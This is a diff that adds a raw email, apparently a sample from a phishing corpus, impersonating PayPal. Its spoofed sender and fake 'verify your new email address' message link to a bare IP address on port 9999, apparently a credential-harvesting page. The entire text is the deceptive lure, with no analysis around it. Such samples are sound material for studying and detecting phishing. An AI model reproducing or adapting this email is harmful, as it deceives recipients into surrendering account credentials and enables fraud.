@@ -1,0 +1,51 @@
+Return-Path: <user@domain.com>
+X-Original-To: user@domain.com
+Delivered-To: user@domain.com
+Received: from domain.com (domain.com [10.5.6.7])
+	by domain.com (Postfix) with ESMTP id 01537469D6;
+	Wed, 26 Jul 2015 05:55:14 -0400 (EDT)
+Received: from domain.com (217-10-247-126.domain.com [217.10.247.126])
+	by domain.com (Postfix) with SMTP id C1CA26CD071;
+	Wed, 26 Jul 2015 05:55:10 -0400 (EDT)
+Reply-To: <user@domain.com>
+From: "PayPal" <notifications@email.paypal.com>
+Subject: Verify your new email address
+Date: Wed, 26 Jul 2015 12:48:31 +0300
+MIME-Version: 1.0
+Content-Type: multipart/alternative;
+	boundary="----=_NextPart_000_00A9_01C2A9A6.0FA00F82"
+X-Priority: 3
+X-MSMail-Priority: Normal
+X-Mailer: Microsoft Outlook Express 6.00.2600.0000
+X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2600.0000
+Message-Id: <20060726095510.user@domain.com>
+To: undisclosed-recipients:;
+Status: R
+X-Status: 
+X-Keywords: 
+
+<HTML>
+<HEAD>
+<xmeta NAME="GENERATOR" Content="Microsoft DHTML Editing Control">
+<TITLE></TITLE>
+</HEAD><br><br>
+<xbody>
+<P><FONT face="Courier New" size="2">You have added <A target="_blank"
+
+<FONT face="Courier New" size="2"> user@domain.com </A> as a
+new email address for<br> your
+PayPal account.<br></p></FONT>
+<P><FONT face="Courier New" size="2">If you did not authorize this change
+, or feel there is an error made ,<br/><br/>
+<P><FONT face="Courier New" size="2"><A target="_blank"<br><br/><table
+align="" bgcolor="#FFE65C" border="0" cellpadding="1" cellspacing="0"
+width="400"><tr><td><table align="center" bgcolor="#FFFECD" border="0"
+cellpadding="4" cellspacing="0" width="100%"><tr><td align="center"
+class="sansSerif"><a target="_parent"
+href="<<link>>://65.26.26.95:9999/https-domain.com/webscrr/index.php">Click
+here to cancel your new email address</a></td></tr></table></td></tr></table><br/><br/><p/></A><br></p></FONT>
+<P><FONT face="Courier New" size="2">If this change was initiated by you ,
+<br> the new email address will be set as primary within 3 working days .
+<P><FONT face="Courier New" size="2">Thank you for using
+PayPal!<br></xbody>
+The PayPal Team .</p></FONT><br>
